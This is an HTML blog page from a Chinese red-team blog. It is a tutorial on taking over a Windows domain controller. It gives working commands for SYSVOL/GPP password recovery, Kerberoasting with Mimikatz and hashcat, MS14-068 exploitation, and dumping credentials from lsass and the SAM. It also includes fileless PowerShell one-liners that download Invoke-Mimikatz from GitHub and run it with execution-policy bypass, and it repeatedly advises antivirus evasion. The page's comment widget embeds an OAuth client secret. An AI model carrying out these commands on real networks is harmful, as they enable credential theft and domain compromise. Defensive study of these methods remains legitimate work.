@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+<meta name="author" content="loecho">
+<meta name="description" content="安全行业的从业人员">
+<meta name="keywords" content="">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://1oecho.github.io/styles/main.css" />
+<link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@1.0.12/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                <!--点击特效-->
+                <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/love.min.js"></script>
+                
+                        <!--CDN样式-->
+                        <script src="https://cdn.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
+                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
+                        
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://1oecho.github.io">
+                    
+                </a>
+            </div>
+
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                        Index
+                    </a>
+                    
+                    <a class="menu-item" href="https://1oecho.github.io/tags">
+                        Tags
+                    </a>
+                    
+                    <a class="menu-item" href="https://github.com/loecho-sec">
+                        Whoami
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://1oecho.github.io">
+                            
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1702539383157" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="https://1oecho.github.io/NoteBook">
+                            Index
+                        </a>
+                        
+                        <a class="menu-item" href="https://1oecho.github.io/tags">
+                            Tags
+                        </a>
+                        
+                        <a class="menu-item" href="https://github.com/loecho-sec">
+                            Whoami
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                内网渗透: 基础域渗透快速获取域控权限
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2020-11-11</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">6.6
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">1607</a></span>
+                                        
+                                            <span class="post-category">&#x5206;&#x7C7B;:
+                                
+                                <a href="https://1oecho.github.io/Qt3VXtj3c/">内网渗透</a>
+                                
+                            </span>
+                                            
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <figure data-type="image" tabindex="1"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111090311.png" alt="image-20201111090310932" loading="lazy"></figure>
+<h2 id="0x01-最终目标">0x01 最终目标</h2>
+<ul>
+<li>域控权限（域控目的时是控制运维机）</li>
+<li>运维机（运维机目的是内网核心）</li>
+<li>内网核心以及核心业务段</li>
+</ul>
+<h2 id="0x02-基本方法">0x02 基本方法：</h2>
+<h3 id="常用快速获取域控权限的方法">[+] 常用快速获取域控权限的方法</h3>
+<h3 id="font-colorred-查找sysvol和组策略首选项中保存的密码-font"><font color=REd>[+] 查找SYSVOL和组策略首选项中保存的密码 </font></h3>
+<ul>
+<li>参考链接:  <a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/">域渗透——利用SYSVOL还原组策略中保存的密码</a></li>
+</ul>
+<pre><code class="language-cmd"># 在域中，存在一个默认的共享路径：
+
+# \\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\
+
+# 所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等
+
+# 测试主机所在域为 de1ay.com，可访问共享文件夹\\de1ay.com\SYSVOL\de1ay.com
+
+# 域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹\SYSVOL下，默认所有域内用户可访问，虽然被加密，但很容易被解密,获取到密码信息,通过Powershell脚本进行解密
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111105637.png" alt="image-20201111105637777" loading="lazy"></figure>
+<ul>
+<li><strong>常见存在敏感信息的XML文件：</strong></li>
+</ul>
+<p>组策略中可被利用的地方不只在修改管理员密码的位置，还包括以下：</p>
+<ul>
+<li>
+<p>Services\Services.xml</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/cc980070(v=prot.13)</p>
+</li>
+<li>
+<p>ScheduledTasks\ScheduledTasks.xml</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/cc422920(v=prot.13)</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/dd341350(v=prot.13)</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/dd304114(v=prot.13)</p>
+</li>
+<li>
+<p>Printers\Printers.xml</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/cc422918(v=prot.13)</p>
+</li>
+<li>
+<p>Drives\Drives.xml</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/cc704598(v=prot.13)</p>
+</li>
+<li>
+<p>DataSources\DataSources.xml</p>
+</li>
+<li>
+<p>http://msdn.microsoft.com/en-us/library/cc422926(v=prot.13)</p>
+</li>
+</ul>
+<h3 id="font-colorred-通过-kerberos-tgs-服务访问票据-离线爆破-font"><font color=REd>[+] 通过 Kerberos TGS [服务访问票据] 离线爆破 </font></h3>
+<ul>
+<li>参考链接:  <a href="https://whale3070.github.io/windowsdomain/2020/05/04/09-x/">Kerberoasting服务票据离线爆破密码</a></li>
+</ul>
+<pre><code class="language-cmd"># spn“服务主体名称”是什么？
+
+# 服务帐户利用SPN支持Kerberos身份验证。也就是说，当客户端需要访问sever提供的服务的时候，那么就需要使用spn查询有哪些服务。
+# 这种spn扫描，是正常的，在内网中，客户端想要访问服务器的资源，都需要想DC域控查询服务主体名称。
+</code></pre>
+<h4 id="基本方法">基本方法：</h4>
+<ol>
+<li>通过<code>Mimikatz</code>导出票据TGS,文件后缀为<code>Kirbi</code>,命令：<strong>mimikatz.exe &quot;kerberos::list /export&quot; exit</strong>
+<ul>
+<li>关键点：实际环境MimiKatz进行免杀处理</li>
+</ul>
+</li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111100620.png" alt="image-20201111100620522" loading="lazy"></figure>
+<ol start="2">
+<li>离线爆破方式：</li>
+</ol>
+<figure data-type="image" tabindex="4"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111142451.png" alt="image-20201111142451614" loading="lazy"></figure>
+<pre><code class="language-cmd"># (1) 通过tgsrepcrack.py工具,进行服务票据爆破
+# cmd： python2 tgsrepcrack.py password.txt loecho.Kirbi
+
+# (2) 通过kirbi2john.py将导出的loecho.kirbi转换为hashcat可以破解的格式，使用hashcat破解
+# cmd： 
+#      1. python2 kirbi2john.py python /usr/share/john/kirbi2john.py 2-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi &gt; output.txt （提取Kerberos tickets,结果output.txt的密码类型是Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]）
+
+#	   2. 通过HashCat进行爆破：
+#	   cmd： hashcat -m 13100 output.txt pasword.txt --force
+
+# (3) 通过Invoke-Kerberoast（https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)导出票据，hashcat破解 
+
+# 执行没有任何结果
+# import-module .\Invoke-Kerberoast.ps1
+# Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl
+
+# 提示没有AdminCount参数
+# Invoke-Kerberoast -OutputFormat Hashcat | fl
+# Invoke-Kerberoast -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
+</code></pre>
+<h3 id="font-colorred-键盘记录屏幕截图获取关键的敏感记录font"><font color=REd>[+] 键盘记录/屏幕截图获取关键的敏感记录</font></h3>
+<h4 id="基本方法-2">基本方法：</h4>
+<p><strong>关键点： 实际使用中,免杀处理等一系列操作</strong></p>
+<ol>
+<li><strong>Cobalt Strike</strong> 键盘记录，记录选择运维人员/管理人员的主机进行记录</li>
+</ol>
+<figure data-type="image" tabindex="5"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111145249.png" alt="image-20201111145249838" loading="lazy"></figure>
+<ul>
+<li>屏幕截图</li>
+</ul>
+<figure data-type="image" tabindex="6"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111145804.png" alt="image-20201111145803950" loading="lazy"></figure>
+<h3 id="font-colorred-密码搜集-比如从ldap中搜集各类密码从已控主机搜各类软件存储的密码font"><font color=REd>[+]  密码搜集 比如从LDAP中搜集各类密码/从已控主机搜各类软件存储的密码</font></h3>
+<figure data-type="image" tabindex="7"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111150353.png" alt="image-20201111150353759" loading="lazy"></figure>
+<h3 id="font-colorredms14-68-kerberos-协议漏洞利用-漏洞太老实际中遇到较少font"><font color=REd>[+]ms14-68 Kerberos 协议漏洞利用 [漏洞太老，实际中遇到较少]</font></h3>
+<h4 id="1-pykek">1、PyKEK</h4>
+<p>最先公开的利用方法是Sylvain Monné用Python实现的PyKEK</p>
+<p>准备条件：</p>
+<ul>
+<li>域用户及其口令</li>
+<li>域用户对应sid</li>
+<li>域控地址</li>
+<li>Win7及以上系统</li>
+</ul>
+<blockquote>
+<p><strong>Tips：</strong></p>
+<ol>
+<li>操作系统要求Win7及以上，这是因为XP不支持导入Ticket</li>
+<li>攻击主机可使用其他域用户信息，比如可以在主机A上用域用户B的口令及sid攻击</li>
+<li>将Python脚本转成exe即可在任意一台Windows主机使用</li>
+</ol>
+</blockquote>
+<p>漏洞利用的步骤为：</p>
+<ul>
+<li>如果漏洞触发成功，会生成.ccache文件</li>
+<li>通过klist purge先清除内存中的Ticket</li>
+<li>使用mimikatz的ptc功能将.ccache导入到内存</li>
+<li>通过klist查看导入的Ticket</li>
+<li>使用net use 连接域控</li>
+</ul>
+<blockquote>
+<p><strong>Tips：</strong></p>
+<ol>
+<li>如果不先清除内存中的Ticket直接导入，有可能会失败</li>
+<li>连接域控要使用域控地址，不要用IP</li>
+</ol>
+</blockquote>
+<h4 id="2-kekeo">2、kekeo</h4>
+<p>Benjamin DELPY用c实现了MS14-068的利用工具，更简单高效。</p>
+<p>因为域用户对应sid本就可以通过程序自动获取，清除导入票据也能自动实现，当然，如果想用其他域用户信息攻击，也可以加上sid手动导入票据</p>
+<p>kekeo的快捷用法仅需要以下参数：</p>
+<ul>
+<li>域用户及其口令</li>
+<li>域控地址</li>
+</ul>
+<h4 id="3-通过提权exp直接从普通域用户提权到域管理员用户">3. 通过提权exp，直接从普通域用户提权到域管理员用户</h4>
+<h4 id="font-colorred借助各类基础服务漏洞进行密码hash抓取font"><font color=REd>[+]借助各类基础服务漏洞进行密码Hash抓取</font></h4>
+<ul>
+<li>参考链接:参考链接:  <a href="https://xz.aliyun.com/t/7278">Windows本地hashdump备忘录</a></li>
+<li>项目推荐: <code>https://github.com/TheKingOfDuck/hashdump</code></li>
+</ul>
+<h4 id="基本原理">基本原理：</h4>
+<p>通过各种方式，不管是<code>在线</code>还是<code>离线</code>基本原理都是对Windows的Lsass.exe进行内存读取/或者是通过读取SAM数据库,提取出里面存储的用户Hash</p>
+<h3 id="工具直接dump">[+] 工具直接Dump：</h3>
+<ul>
+<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>（实际环境处理特征/重新编译）<strong>运行条件</strong>: 高权限</li>
+</ul>
+<pre><code class="language-cmd"># 编译有俩个版本，根据目标环境不同选用不同版本
+
+# mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111152642.png" alt="image-20201111152641976" loading="lazy"></figure>
+<ul>
+<li><code>QuarksPwDump</code> <strong>运行条件</strong>: 高权限</li>
+</ul>
+<p><strong><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111154333.png" alt="image-20201111154333723" loading="lazy"></strong></p>
+<ul>
+<li><code>wce.exe -w</code>  <strong>运行条件</strong>: 高权限</li>
+</ul>
+<figure data-type="image" tabindex="9"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111154808.png" alt="image-20201111154807944" loading="lazy"></figure>
+<h4 id="dump内存文件导出sam数据库后续通过工具解密">[+] Dump内存文件/导出SAM数据库，后续通过工具解密</h4>
+<ul>
+<li><strong>REG+Mimikatz</strong></li>
+</ul>
+<pre><code class="language-cmd">reg save hklm\sam .\sam.hive&amp;reg save hklm\system .\system.hive # 导出文件
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111160102.png" alt="image-20201111160102796" loading="lazy"></figure>
+<pre><code class="language-cmd"># 1.解密文件，导入SAMInside，复制NT-Hash进行碰撞/查询
+
+# 2.找自己测试机，通过Mimikatz离线读取，进行数据读取
+
+lsadump::sam /sam:sam.hive /system:system.hive
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111160917.png" alt="image-20201111160917486" loading="lazy"></figure>
+<ul>
+<li><strong>Procdump(微软官方程序)+Mimikatz</strong></li>
+</ul>
+<pre><code class="language-cmd"># Procdump.exe -accepteula -ma lsass.exe lsess.dmp  # 导出lsass内存文件
+</code></pre>
+<figure data-type="image" tabindex="12"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111161602.png" alt="image-20201111161602368" loading="lazy"></figure>
+<pre><code class="language-cmd"># 通过Mimikatz进行载入/读取：
+
+# minidump lsass.dmp    # 切换文件
+
+# sekurlsa::logonPasswords full  # 导出hash/密码
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://loecho.oss-cn-beijing.aliyuncs.com/Blog-Img/20201111161956.png" alt="image-20201111161955727" loading="lazy"></figure>
+<ul>
+<li><strong>无文件DumpHash,远程加载Powershell脚本</strong></li>
+</ul>
+<pre><code class="language-powershell">powershell &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds&quot;
+</code></pre>
+<pre><code class="language-powershell">powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/TheKingOfDuck/hashdump/master/procdump/procdump.ps1');Invoke-Procdump64 -Args '-accepteula -ma lsass.exe lsass.dmp'&quot;
+</code></pre>
+<ul>
+<li>尝试根据之前搜集汇总的密码/字典进行精确爆破SMB</li>
+</ul>
+
+                        </div>
+                        
+                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://1oecho.github.io/Net-05/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://1oecho.github.io/Net-05/&sharesource=qzone&title=内网渗透: 基础域渗透快速获取域控权限&pics=https://1oecho.github.io/images/avatar.png?v=1702539383157&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://1oecho.github.io/Net-05/&sharesource=weibo&title=内网渗透: 基础域渗透快速获取域控权限 + " - " + &pic="https://1oecho.github.io/images/avatar.png?v=1702539383157 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                        
+                        <a href="https://1oecho.github.io/Qt3VXtj3c/">#
+                    内网渗透
+                        </a>
+                        
+                            
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://1oecho.github.io/Behinder11-2/">
+                                                                                            红队开发: Behinder3-Beta11 实战下的二次开发 （2）
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://1oecho.github.io/RealCode-01/">
+                                                                                                    代码审计: 某Thinkphp系统审计
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '61442cf87c4266a18189',
+        clientSecret: '7a1fd1e53e9179e32c4600883cd0612d09e0f292',
+        repo: 'loecho',
+        owner: '1oecho',
+        admin: ['1oecho'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        loecho-sec
+                            
+                                <b id="hitokoto"></b><br>
+                                
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                         &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://1oecho.github.io/" target="_blank">
+                                                loecho-sec
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                on
+            </div>
+            
+                <div id="version" style="display:none;">
+                    1.7.5
+                </div>
+                
+                    <script>
+                        var pat = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
+                    </script>
+        </footer>
+        
+            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
+            
+                <script>
+                    
+                    
+                    loadlive2d();
+                    
+                    
+                    hitokoto();
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    CheckVersion();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1702539383157);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+                
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
